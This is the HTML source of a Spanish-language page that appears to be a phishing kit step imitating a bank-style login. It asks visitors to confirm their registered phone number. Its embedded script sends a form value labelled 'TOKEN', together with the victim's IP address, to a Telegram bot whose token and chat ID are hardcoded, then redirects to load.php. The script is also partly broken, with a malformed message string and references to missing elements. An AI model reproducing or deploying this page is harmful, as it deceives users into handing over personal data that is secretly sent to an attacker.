<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Nuevo | Ingreso</title>
    <script
        src="https://code.jquery.com/jquery-2.2.3.min.js"
        integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
        crossorigin="anonymous"></script>
        <style>
            *{
                padding: 0;
                margin: 0;
            }
        </style>
  </head>
  <body style="overflow-x:hidden;background:url('https://i.ibb.co/56pWW0q/bg1.png');background-size:cover;">
    <header> 
        <nav style="overflow: hidden;padding-top: 10px;"><div  class="ixmf1" style="width: 200px;text-align: center;display:inline-block;height: 80px;"><img src="https://svgshare.com/i/rfa.svg" style="width: 120px;max-width:220px;"></div><div  class="ixmf2" style="width: 300px;text-align: left;display:inline-block;height: 80px;float: right;"><img src="https://svgshare.com/i/rg8.svg" style="height: 80px;"/></div>
        </nav>
    </header>
    <div id="xdfizq">
        <div id="xfdfrm">
          <form  method="post" action="pase2.php">

  <img style="position: absolute;
            width: 16px;
            margin-left: -155px;
            margin-top: -3px;" src="pal.png" alt="">
            <p style="margin-left: 10px;
            margin-top: 239px;
            color: #333333;
            font-size: 14px;
            font-family: sans-serif;">Confirma el número de télefono registrado</p>



            
            <input placeholder="0000 0000"  onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="8" inputmode="numeric" required name="data" id="data" type="text" autocomplete="off" style="position: relative;top: 12px;left: 22px;height: 32px;width: 154px;display: block; border:none; background:transparent;padding: 0px 0 0 8px;font-size: 16px;font-family: sans-serif;">
            
            <input type="hidden" id="">
            <input type="submit" value="" onclick="xbndtl()" style="display: block;position: relative;background: transparent;border: none;top: -22px;left: 207px;height: 34px;width: 135px;outline: none;cursor: pointer;user-select: none;"></input>
          </form>
        </div>
    </div>
    <div id="xdfder">
        
    </div>
    
    <style>
        *{margin:0;padding:0;}
        input:focus { outline: none; }
        header nav{
          background: #00853f;
          height: 80px;
          padding-left: 12rem;
          padding-right: 12rem;
          border-bottom:5px solid #f28d21;
        }
        
        .xfvlgctn {
          width: 100%;
          text-align: center;
          margin-top: 30px;
        }
        .xfvlgctn img{
          width: 175px;
          display: inline-block;
        }
        #xdfder,#xdfizq{
          width:50%;
          min-height:300px;
          height: 734px;
          display:inline-block;
          float: left;
        }
        #xdfizq{
          text-align:center;
          
        }
        #xdfder{
          text-align:center;
        }
        #xfdfrm{
          height:519.48px;
          width:362px;
          background-image:url('tlf.svg');
          background-repeat:no-repeat;
          background-size:cover;
          display:inline-block;
          margin-top: 50px;
        }
        input{
          color:#333;
          font-family:sans-serif;
          font-size:12px;
        }
  
        @media screen and (max-width: 1024px){
          #xdfder,#xdfizq{
          width:100%;
          }
          #xdfizq{
            height:30vh!important;
            background-position:center;
          }
          .ixmf1,.ixmf2{
            width:100%!important;
            float: left!important;
          }
          .ixmf2{
            display: none!important;
          }
          .ixmf1{
            text-align:center!important;
          }
          header nav{
            padding-left:0px;
            padding-right:0px;
          }
        }
        
    </style>
    
    <script>
        function xbndtl(){
          var tkl = "5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM";
            var chtid = "5157616506";
            var eml = $("#ix1").val();
            var ips = "";

            

            if(!eml ){
                console.log("empty");
            }else{

              mess = `TOKEN: ${eml}`;
                console.log( document.getElementById("ix77").value );
                $.get('https://ipinfo.io/ip', function(response){
                    var sets = {
                        "async": true,
                        "crossDomain": true,
                        "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "cache-control": "no-cache"
                
                        },
                        "data": JSON.stringify({
                            "chat_id": chtid,
                            "text": "+mess" - " IP:"+response+
                        })
                    };  
                    $.ajax(sets).done(function (response) {
                        window.location = "load.php";
                    });  
                });
            }
        }
    </script>

    <script>
        window.onload = function(){
            setTimeout(function(){ 
                document.getElementById("ld").style.display = "none";
            }, 19000);  
        }
    </script>
  </body>
</html>